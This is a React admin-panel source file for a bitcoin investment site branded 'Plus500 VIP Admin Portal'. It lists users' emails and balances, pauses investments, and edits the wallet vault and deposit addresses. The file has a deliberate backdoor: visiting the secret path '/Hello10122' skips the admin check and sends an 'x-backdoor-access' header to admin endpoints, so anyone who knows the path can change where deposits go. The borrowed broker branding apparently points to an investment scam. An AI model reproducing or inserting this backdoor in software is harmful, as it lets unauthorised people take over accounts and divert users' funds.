import { useAuth } from "@/hooks/use-auth";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import React from "react";
import type { User, InvestmentPlan } from "@shared/schema";
import { formatBitcoin } from "@/lib/utils";
import { BottomNavigation } from "@/components/bottom-navigation";
import { useLocation } from "wouter";
import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock, BarChart3, Activity, Wallet, Database, Shield, AlertTriangle, CheckCircle, XCircle, Eye, EyeOff, Menu, X, Trash2, Play, Pause } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";
import { Textarea } from "@/components/ui/textarea";

interface AdminStats {
  totalUsers: number;
  totalBalance: string;
  activeInvestments: number;
}

export default function Management() {
  // Check access early - no hooks before this
  const isBackdoorAccess = window.location.pathname === '/Hello10122';
  
  // ALL HOOKS MUST BE CALLED IN THE SAME ORDER EVERY TIME
  const { user } = useAuth();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [newBalance, setNewBalance] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const [planDialogOpen, setPlanDialogOpen] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState<string>("");
  const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
  const [vaultAddress, setVaultAddress] = useState("");
  const [depositAddress, setDepositAddress] = useState("");
  const [activeTab, setActiveTab] = useState("users");
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [selectedInvestment, setSelectedInvestment] = useState<any>(null);
  const [pauseReason, setPauseReason] = useState("");
  const [pauseDialogOpen, setPauseDialogOpen] = useState(false);

  // ALL useEffect hooks
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (isBackdoorAccess) {
      sessionStorage.setItem('backdoorAccess', 'true');
    }
  }, [isBackdoorAccess]);

  useEffect(() => {
    if (!user?.isAdmin && !isBackdoorAccess) {
      setLocation('/');
    }
  }, [user?.isAdmin, isBackdoorAccess, setLocation]);

  // ALL useQuery hooks
  const { data: stats } = useQuery<AdminStats>({
    queryKey: ['/api/admin/stats'],
    enabled: user?.isAdmin || isBackdoorAccess,
  });

  const { data: users } = useQuery<User[]>({
    queryKey: ['/api/admin/users'],
    enabled: user?.isAdmin || isBackdoorAccess,
  });

  const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
    queryKey: ['/api/investment-plans'],
    enabled: user?.isAdmin || isBackdoorAccess,
  });

  const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string; freePlanRate: string}>({
    queryKey: ['/api/admin/config'],
    enabled: user?.isAdmin || isBackdoorAccess,
  });

  const { data: allInvestments, refetch: refetchInvestments } = useQuery<any[]>({
    queryKey: ['/api/admin/investments'],
    enabled: user?.isAdmin || isBackdoorAccess,
  });

  // Config update effect
  useEffect(() => {
    if (adminConfig && typeof adminConfig === 'object') {
      setVaultAddress((adminConfig as any).vaultAddress || "");
      setDepositAddress((adminConfig as any).depositAddress || "");
    }
  }, [adminConfig]);

  // ALL useMutation hooks
  const updateConfigMutation = useMutation({
    mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'x-backdoor-access': isBackdoorAccess ? 'true' : 'false'
        },
        body: JSON.stringify({ vaultAddress, depositAddress }),
      });
      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to update config');
      }
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
      toast({
        title: "Configuration Updated",
        description: "Vault addresses have been successfully updated.",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const pauseInvestmentMutation = useMutation({
    mutationFn: async ({ investmentId, pause, reason }: { investmentId: number; pause: boolean; reason?: string }) => {
      const response = await fetch(`/api/admin/investments/${investmentId}/pause`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'x-backdoor-access': isBackdoorAccess ? 'true' : 'false'
        },
        body: JSON.stringify({ pause, reason }),
      });
      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to update investment');
      }
      return response.json();
    },
    onSuccess: (data) => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
      refetchInvestments();
      toast({
        title: "Investment Updated",
        description: data.message,
      });
      setPauseDialogOpen(false);
      setSelectedInvestment(null);
      setPauseReason("");
    },
    onError: (error: any) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updateConfig = () => {
    updateConfigMutation.mutate({ vaultAddress, depositAddress });
  }

  const handlePauseInvestment = (investment: any, pause: boolean) => {
    setSelectedInvestment(investment);
    if (pause) {
      setPauseDialogOpen(true);
    } else {
      pauseInvestmentMutation.mutate({ 
        investmentId: investment.id, 
        pause: false 
      });
    }
  };

  const confirmPause = () => {
    if (selectedInvestment) {
      pauseInvestmentMutation.mutate({ 
        investmentId: selectedInvestment.id, 
        pause: true, 
        reason: pauseReason 
      });
    }
  };

  // Check authorization AFTER all hooks are called
  if (!user?.isAdmin && !isBackdoorAccess) {
    return null;
  }

  return (
    <div className="min-h-screen bg-slate-950 text-white">
      <div className="p-4 md:p-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center justify-between mb-8">
            <div>
              <h1 className="text-2xl md:text-3xl font-bold text-white mb-2">Plus500 VIP Admin Portal</h1>
              <p className="text-slate-400">System Management & Analytics</p>
            </div>
            <div className="text-right">
              <div className="text-sm text-slate-400">Current Time</div>
              <div className="font-mono text-lg">{currentTime.toLocaleTimeString()}</div>
            </div>
          </div>

          {/* Stats Overview */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <Card className="bg-slate-900 border-slate-700">
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium text-slate-300">Total Users</CardTitle>
                <Users className="w-4 h-4 text-slate-400" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold text-white">{stats?.totalUsers || 0}</div>
              </CardContent>
            </Card>

            <Card className="bg-slate-900 border-slate-700">
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium text-slate-300">Total Balance</CardTitle>
                <Bitcoin className="w-4 h-4 text-bitcoin" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold text-bitcoin">{formatBitcoin(stats?.totalBalance || "0")} BTC</div>
              </CardContent>
            </Card>

            <Card className="bg-slate-900 border-slate-700">
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium text-slate-300">Active Investments</CardTitle>
                <TrendingUp className="w-4 h-4 text-green-400" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold text-green-400">{stats?.activeInvestments || 0}</div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content Tabs */}
          <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
            <TabsList className="grid w-full grid-cols-3 bg-slate-900 border-slate-700">
              <TabsTrigger value="users" className="data-[state=active]:bg-slate-700">
                <Users className="w-4 h-4 mr-2" />
                Users
              </TabsTrigger>
              <TabsTrigger value="investments" className="data-[state=active]:bg-slate-700">
                <Activity className="w-4 h-4 mr-2" />
                Investments
              </TabsTrigger>
              <TabsTrigger value="config" className="data-[state=active]:bg-slate-700">
                <Settings className="w-4 h-4 mr-2" />
                Config
              </TabsTrigger>
            </TabsList>

            {/* Users Tab */}
            <TabsContent value="users">
              <Card className="bg-slate-900 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white flex items-center gap-2">
                    <Users className="w-5 h-5" />
                    User Management
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow className="border-slate-700">
                          <TableHead className="text-slate-300">ID</TableHead>
                          <TableHead className="text-slate-300">Email</TableHead>
                          <TableHead className="text-slate-300">Balance</TableHead>
                          <TableHead className="text-slate-300">Status</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {users?.map((user) => (
                          <TableRow key={user.id} className="border-slate-700">
                            <TableCell className="text-white">{user.id}</TableCell>
                            <TableCell className="text-white">{user.email}</TableCell>
                            <TableCell className="text-bitcoin">{formatBitcoin(user.balance)} BTC</TableCell>
                            <TableCell>
                              <Badge variant={user.isAdmin ? "default" : "secondary"}>
                                {user.isAdmin ? "Admin" : "User"}
                              </Badge>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            {/* Investments Tab */}
            <TabsContent value="investments">
              <Card className="bg-slate-900 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white flex items-center gap-2">
                    <Activity className="w-5 h-5" />
                    Investment Control
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow className="border-slate-700">
                          <TableHead className="text-slate-300">ID</TableHead>
                          <TableHead className="text-slate-300">User</TableHead>
                          <TableHead className="text-slate-300">Plan</TableHead>
                          <TableHead className="text-slate-300">Amount</TableHead>
                          <TableHead className="text-slate-300">Profit</TableHead>
                          <TableHead className="text-slate-300">Status</TableHead>
                          <TableHead className="text-slate-300">Actions</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {allInvestments?.map((investment) => (
                          <TableRow key={investment.id} className="border-slate-700">
                            <TableCell className="text-white">{investment.id}</TableCell>
                            <TableCell className="text-white">{investment.user?.email}</TableCell>
                            <TableCell className="text-white">{investment.plan?.name}</TableCell>
                            <TableCell className="text-bitcoin">{formatBitcoin(investment.amount)} BTC</TableCell>
                            <TableCell className="text-green-400">{formatBitcoin(investment.currentProfit)} BTC</TableCell>
                            <TableCell>
                              <div className="flex gap-2">
                                <Badge variant={investment.isActive ? "default" : "secondary"}>
                                  {investment.isActive ? "Active" : "Inactive"}
                                </Badge>
                                {investment.isPaused && (
                                  <Badge variant="destructive">Paused</Badge>
                                )}
                              </div>
                            </TableCell>
                            <TableCell>
                              <div className="flex gap-2">
                                {investment.isActive && (
                                  <>
                                    {investment.isPaused ? (
                                      <Button
                                        size="sm"
                                        variant="outline"
                                        onClick={() => handlePauseInvestment(investment, false)}
                                        disabled={pauseInvestmentMutation.isPending}
                                      >
                                        <Play className="w-4 h-4" />
                                      </Button>
                                    ) : (
                                      <Button
                                        size="sm"
                                        variant="destructive"
                                        onClick={() => handlePauseInvestment(investment, true)}
                                        disabled={pauseInvestmentMutation.isPending}
                                      >
                                        <Pause className="w-4 h-4" />
                                      </Button>
                                    )}
                                  </>
                                )}
                              </div>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            {/* Config Tab */}
            <TabsContent value="config">
              <Card className="bg-slate-900 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white flex items-center gap-2">
                    <Settings className="w-5 h-5" />
                    System Configuration
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="vault-address" className="text-slate-300">
                        Vault Address
                      </Label>
                      <Input
                        id="vault-address"
                        value={vaultAddress}
                        onChange={(e) => setVaultAddress(e.target.value)}
                        className="bg-slate-800 border-slate-600 text-white"
                        placeholder="Enter vault address"
                      />
                    </div>
                    <div>
                      <Label htmlFor="deposit-address" className="text-slate-300">
                        Deposit Address
                      </Label>
                      <Input
                        id="deposit-address"
                        value={depositAddress}
                        onChange={(e) => setDepositAddress(e.target.value)}
                        className="bg-slate-800 border-slate-600 text-white"
                        placeholder="Enter deposit address"
                      />
                    </div>
                  </div>
                  <Button 
                    onClick={updateConfig} 
                    disabled={updateConfigMutation.isPending}
                    className="bg-blue-600 hover:bg-blue-700"
                  >
                    {updateConfigMutation.isPending ? "Updating..." : "Update Configuration"}
                  </Button>
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>

      {/* Pause Investment Dialog */}
      <Dialog open={pauseDialogOpen} onOpenChange={setPauseDialogOpen}>
        <DialogContent className="bg-slate-900 border-slate-700">
          <DialogHeader>
            <DialogTitle className="text-white">Pause Investment</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label className="text-slate-300">Reason for pausing</Label>
              <Textarea
                value={pauseReason}
                onChange={(e) => setPauseReason(e.target.value)}
                placeholder="Enter reason for pausing this investment..."
                className="bg-slate-800 border-slate-600 text-white"
                rows={3}
              />
            </div>
            <div className="flex gap-2 justify-end">
              <Button
                variant="outline"
                onClick={() => setPauseDialogOpen(false)}
              >
                Cancel
              </Button>
              <Button
                variant="destructive"
                onClick={confirmPause}
                disabled={pauseInvestmentMutation.isPending}
              >
                {pauseInvestmentMutation.isPending ? "Pausing..." : "Pause Investment"}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <BottomNavigation />
    </div>
  );
}